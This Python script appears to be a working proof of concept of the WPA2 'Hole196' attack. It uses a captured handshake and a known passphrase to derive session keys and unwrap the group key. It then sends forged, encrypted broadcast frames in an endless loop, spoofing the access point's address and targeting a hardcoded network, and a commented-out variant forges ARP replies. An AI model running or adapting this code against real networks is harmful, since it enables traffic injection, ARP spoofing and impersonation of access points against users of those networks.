
import binascii
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from scapy.layers.dot11 import RadioTap,  Dot11, Dot11CCMP, LLC
from scapy.layers.l2 import SNAP, ARP
from scapy.layers.inet import IP, ICMP
from scapy.all import *

from cls_collPcap import collPcap
from def_getPMK import getPMK
from def_getPTK import getPTK
from cls_ccmp import ccmp
import time

def pn2bytes(pn:int)->bytes:
	pn_bytes = [0] * 6
	for i in range(6):
		pn_bytes[i] = pn & 0xFF
		pn >>= 8
	return pn_bytes

def produce_sc(frag: int, seq: int) -> int:
    return (seq << 4) + frag

def atkHole196(pcapPath:str, pwd:str):
    collCls = collPcap()
    collCls.read(pcapPath, hashcatFlag=False)
    
    pmk = getPMK(collCls.ESSID, pwd)
    ptk = getPTK(pmk, collCls.MAC_AP, collCls.MAC_CLIENT, collCls.NONCE_AP, collCls.NONCE_CLIENT)
    kek = ptk[16:32]
    kck = ptk[0:16]
    print('kCk :', kck)
    GTK_DECDATA = aes_key_unwrap(kek, collCls.GTK_ENCDATA)
    gtk = b''
    idx = 0
    while (idx <= len(GTK_DECDATA)-1):
        if GTK_DECDATA[idx] != 221:
            # Vendor Specific 태그를 찾을 때까지 반복
            print(GTK_DECDATA[idx])
            idx += int(GTK_DECDATA[idx+1])+2
        else:
            # 해당 태그를 찾으면 GTK 슬라이싱 후 반복 종료
            gtk = GTK_DECDATA[idx+8:idx+24]
            break
    
    print(binascii.hexlify(gtk).decode('ascii'))

    
    bssAddr ='3C:A3:15:06:70:02' # FreeZio.2.4
    srcAddr = '50:77:05:96:30:0a' # Pseudo MAC
    dstAddr = 'FF:FF:FF:FF:FF:FF'

    bssMAC ='3C:A3:15:06:70:0b' # FreeZio.2.4    

    seq = 1
    pn = 500
    while(True):
        plainFrame = LLC()/SNAP()/\
            IP(src='192.168.0.128', dst='192.168.0.1')/ICMP()/Raw(b"icmp_ping_test")
        
        # plainFrame = LLC()/SNAP()/\
        # ARP(hwsrc='11:22:33:44:55:66', hwdst=srcAddr, psrc='192.168.0.1', pdst='192.168.0.128' ,op=2)
        
        encFrame = ccmp.encrypt(gtk, plainFrame, dstAddr, bssAddr, srcAddr, pn)
        encFrame = RadioTap() /\
            Dot11(type=2, subtype=0, addr1=dstAddr, addr2=bssAddr, addr3=srcAddr)/\
            Dot11CCMP() /\
            Raw(encFrame) # from-DS
        
        # encFrame = ccmp.encrypt(gtk, plainFrame, bssAddr, srcAddr, dstAddr, pn)
        # encFrame = RadioTap() /\
        #     Dot11(type=2, subtype=0, addr1=bssAddr, addr2=srcAddr, addr3=dstAddr)/\
        #     Dot11CCMP() /\
        #     Raw(encFrame) # to-DS
        
        #encFrame.FCfield = "to-DS"
        encFrame.FCfield = "from-DS"
        encFrame.SC=0
        
        encFrame.FCfield |= Dot11(FCfield="protected").FCfield
        encFrame.PN0, encFrame.PN1, encFrame.PN2, encFrame.PN3, encFrame.PN4, encFrame.PN5 = pn2bytes(pn)
        encFrame.key_id = 1
        encFrame.ext_iv = 1
        sendp(encFrame)
        pn +=1000
        seq += 1
        
        print(pn)
        time.sleep(0.5)
    # 